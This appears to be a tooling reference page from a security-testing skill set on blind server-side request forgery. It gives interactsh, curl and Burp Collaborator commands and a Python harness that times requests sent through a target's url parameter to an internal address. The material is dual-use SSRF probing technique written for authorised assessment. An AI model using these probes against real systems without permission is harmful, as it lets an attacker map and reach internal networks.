# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`ssrf-blind-ssrf`](SKILL.md) | Family: **Web and Application**

Flags below are the ones this technique actually needs. Verify with `--help` on your installed version before relying on an exact spelling.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `interactsh-client` | `interactsh-client -v -json` | Allocate unique OAST tokens and record the source address and protocol stage of each callback | Cross-platform |
| `curl` | `for i in 1 2 3 4 5; do curl -sS -o /dev/null -w '%{time_total}\n' 'https://target.example/ping?url=https://control.<assessor-oast-host>/'; done` | Build the timing jitter baseline from repeated control requests before probing | Linux, macOS |
| `Burp Collaborator` | `Insert a Collaborator payload as the url value, then poll the Collaborator tab for the interaction type` | Correlate a single request to a callback and distinguish DNS-only from HTTP interactions | Cross-platform |

## Minimal Script Shape

A timing-baseline harness: it samples a control destination repeatedly, builds a mean-plus-two-sigma threshold, then compares one conditional probe against that threshold.

```python
import statistics
import time
import urllib.parse
import urllib.request

BASE = "https://target.example/ping"

def elapsed(url_value):
    full = BASE + "?url=" + urllib.parse.quote(url_value, safe="")
    start = time.perf_counter()
    try:
        with urllib.request.urlopen(full, timeout=10) as r:
            r.read()
    except Exception:
        pass
    return time.perf_counter() - start

controls = [elapsed("https://control.example/") for _ in range(8)]
baseline = statistics.mean(controls) + 2 * statistics.pstdev(controls)
probe = elapsed("http://10.0.0.5:80/")
print({"baseline_s": round(baseline, 3), "probe_s": round(probe, 3),
       "exceeds_baseline": probe > baseline})
```
